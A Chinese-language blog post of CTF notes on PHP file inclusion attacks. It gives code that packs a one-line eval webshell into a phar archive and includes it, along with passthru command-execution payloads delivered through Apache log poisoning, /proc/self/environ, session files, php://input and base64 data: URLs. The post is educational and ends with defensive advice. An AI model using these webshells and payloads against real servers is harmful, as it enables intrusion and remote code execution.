---
title: 文件包含漏洞（二）
tags:
  - PHP
  - 文件包含
id: 274
categories:
  - Web安全
  - 未分类
date: 2016-12-03 16:28:53
---

之前已经总结了一次文件包含漏洞相关的知识点，最近一段时间做CTF又遇到了不少以前没见过的包含新姿势，这里在总结一下，以后看的时候方便一些。
<!--more-->
## <del></del>phar LFI

### 0x01 什么是phar文件

phar是一个文件归档的包，类似于Java中的Jar文件，方便了PHP模块的迁移。

php中默认安装了这个模块。

### 0x02 创建一个phar文件

在创建phar文件的时候要注意phar.readonly这个参数要为off，否则phar文件不可写。

```php
<?php

$p = new phar("shell.phar", 0 , "shell.phar");

$p->startBuffering();

$p['shell.php'] = '<?php phpinfo(); @eval($_POST[x])?>';

$p->setStub("<?php Phar::mapPhar('shell.phar'); __HALT_COMPILER?>");

?>
```

运行以上代码后会在当前目录下生成一个名为shell.phar的文件，这个文件可以被include，file_get_contents等函数利用

### 0x03 利用phar

利用phar文件的方法很简单，利用phar特定的格式就可以加以利用

```php
<?php

include 'phar://shell.phar/shell.php';

?>
```

这样就可以成功把shell包含进来。当我们把shell.phar文件重命名为shell.aaa等一些无效的后缀名时，一样可以使用，说明了phar文件不受文件格式的影响。

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/12/5e01b381ad62e11dd74805a4177bc152.png)

### 0x04 思路

有了phar文件，我们就能有一些猥琐的思路了，比如上传的文件名遭到了限制，我们无法上传php的文件，但是却只能包含php文件的时候（包含文件后缀名被限制 include '$file'.'.php'），我们就可以通过上传phar文件，再利用php伪协议来包含。

### 0x05 扩展

与phar类似的还有，zip://协议也与phar类似，但是上传了包含有一句话的zip文件后包含的姿势有所不同

include 'zip://shell.zip#shell.php' 利用#隔开，在URL中包含时要用%23，与URL中#号区分开。

（注意：php 5.3.4后已经修复了%00截断漏洞）

## 包含命令执行

先准备好代码&lt;? passthru($_GET[cmd])?&gt;上传到服务器，然后利用文件包含就可以。

### 0x01 包含apache日志

请求不存在的页面:http://host/aaaaa=&lt;? passthru($_GET[cmd])?&gt;

然后包含日志文件：

http://host/?file=../../../../var/apache/error_log&amp;cmd=ls

如果apache日志文件遭到了路径修改，可以利用爆路径等方式来找日志路径。

### 0x02 利用环境变量进行插入

/proc/self 指向最后一个PID使用的连接

在linux中，/proc/self可写并且位置固定。

将代码放在User-Agent中进行提交 请求http://host?file=../../../proc/self/environ&amp;cmd=ls

### 0x03 利用图马进行包含

### 0x04 利用session文件

如果知道session的字段。

http://host?user=&lt;? passthru($_GET[cmd])?&gt;

找到session文件储存的位置(常用/tmp/session)

### 0x05 利用php://input

`
<?php
$data = file_get_contents('php://input');
echo $data;
?>
`

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/12/d1660fedd8e4cfacdc61fbb3d39e1792.png)

(注意：需要allow_url_include = On 且 PHP &gt;= 5.2.0)

### 0x06 data URL代码执行

我们可以将攻击代码转换为data:URL形式进行攻击，但是直接在URL连接中出现一些敏感字符，会导致被waf检测，所以我们需要给攻击代码进行base64编码。

http://localhost/test/phar%20LFI/postinput.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/12/90d47eb1cb5e3f380948909548dee61d.png)

## 

文件包含的利用姿势很多，一个文件包含可能直接导致getshell或者被利用成了代码执行漏洞，后果十分验证，所以在使用这些文件包含函数的时候，一定要对包含进来的文件进行过滤处理，避免漏洞的产生。

## 参考链接：

https://digi.ninja/blog/when_all_you_can_do_is_read.php 常用包含路径

https://wiki.apache.org/httpd/DistrosDefaultLayout 官方路径

http://static.hx99.net/static/drops/web-13249.html